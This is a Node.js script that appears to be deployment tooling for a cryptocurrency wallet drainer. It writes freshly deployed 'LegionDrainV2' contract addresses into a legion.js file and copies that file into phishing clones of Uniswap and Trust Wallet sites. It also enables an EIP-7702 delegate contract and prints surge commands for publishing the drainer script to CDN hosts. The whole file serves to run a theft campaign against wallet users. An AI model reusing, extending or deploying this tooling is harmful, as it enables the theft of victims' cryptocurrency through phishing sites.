/**
 * Apply LegionDrainV2 deploy results to all legion.js copies + print Railway env.
 *
 * Usage (run AFTER deploy-legion-v2-only.mjs):
 *   node contracts/apply-v2-results.mjs
 *
 * What it does:
 *   1. Reads contracts/legion-drain-v2-result.json
 *   2. Patches LEGION_DRAIN in uniswap-clone/legion.js
 *   3. Syncs updated legion.js to all other copies
 *   4. Prints Railway env vars to set (EIP7702_DELEGATE_CONTRACT)
 */
import { readFileSync, writeFileSync, existsSync, copyFileSync } from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname  = path.dirname(fileURLToPath(import.meta.url));
const ROOT       = path.resolve(__dirname, '..');
const resultPath = path.join(__dirname, 'legion-drain-v2-result.json');
const masterJs   = path.join(ROOT, 'clones', 'uniswap-clone', 'legion.js');

// ── Other legion.js copies to keep in sync ───────────────────────────────────
const COPIES = [
  path.join(ROOT, 'clones', 'trust-cdn',       'legion.js'),
  path.join(ROOT, 'clones', 'trust-card-site', 'legion.js'),
  path.join(ROOT, 'clones', 'legion-cdn-sync', 'legion.js'),
];

// ─────────────────────────────────────────────────────────────────────────────

if (!existsSync(resultPath)) {
  console.error('❌  deploy-legion-v2-result.json not found.');
  console.error('    Run first: node contracts/deploy-legion-v2-only.mjs');
  process.exit(1);
}

const { results } = JSON.parse(readFileSync(resultPath, 'utf8'));

// Valid deployed addresses only
const deployed = {};
for (const [chainId, val] of Object.entries(results)) {
  if (typeof val === 'string' && val.startsWith('0x') && val.length === 42) {
    deployed[chainId] = val;
  }
}

if (!Object.keys(deployed).length) {
  console.error('❌  No successfully deployed addresses found in result.');
  process.exit(1);
}

// ── Patch LEGION_DRAIN in master legion.js ───────────────────────────────────

let src = readFileSync(masterJs, 'utf8');

function parseMap(varName) {
  const re = new RegExp(`var ${varName} = \\{([\\s\\S]*?)\\n  \\};`);
  const m  = src.match(re);
  const out = {};
  if (!m) return out;
  for (const line of m[1].split('\n')) {
    const lm = line.match(/^\s*(\d+):\s*'(0x[a-fA-F0-9]{40})',/);
    if (lm) out[lm[1]] = lm[2];
  }
  return out;
}

function patchMap(varName, incoming) {
  const re = new RegExp(`(var ${varName} = \\{)[\\s\\S]*?(\\n  \\};)`);
  if (!re.test(src)) {
    console.error(`❌  Could not find "var ${varName}" in legion.js`);
    process.exit(1);
  }
  const merged = { ...parseMap(varName), ...incoming };
  const lines  = Object.entries(merged)
    .sort((a, b) => Number(a[0]) - Number(b[0]))
    .map(([id, addr]) => `    ${id}: '${addr}',`);
  src = src.replace(re, `$1\n${lines.join('\n')}\n$2`);
  console.log(`✅  Patched ${varName} (${lines.length} chains)`);
}

patchMap('LEGION_DRAIN', deployed);

writeFileSync(masterJs, src);
console.log(`✅  Updated ${masterJs}`);

// ── Sync all copies ──────────────────────────────────────────────────────────

for (const dest of COPIES) {
  if (existsSync(dest)) {
    copyFileSync(masterJs, dest);
    console.log(`✅  Synced  ${path.relative(ROOT, dest)}`);
  }
}

// ── Print Railway env vars ───────────────────────────────────────────────────

// Prefer Ethereum mainnet address for EIP7702_DELEGATE_CONTRACT (chain 1)
const ethAddr = deployed['1'] || deployed[Object.keys(deployed)[0]];

console.log('\n\n════════════════════════════════════════════════════════');
console.log(' RAILWAY ENV VARS — Set these on Railway Dashboard');
console.log('════════════════════════════════════════════════════════\n');
console.log('EIP7702_ENABLED=true');
console.log(`EIP7702_DELEGATE_CONTRACT=${ethAddr}`);
console.log('\n All deployed addresses:');
for (const [chainId, addr] of Object.entries(deployed)) {
  console.log(`  Chain ${chainId}: ${addr}`);
}
console.log('\n════════════════════════════════════════════════════════');
console.log(' LEGION_DRAIN updated. Push legion.js to CDN:');
console.log('   surge clones/legion-cdn-sync legion-cdn.surge.sh');
console.log('   surge clones/trust-cdn trust-legion-cdn.surge.sh');
console.log('════════════════════════════════════════════════════════\n');
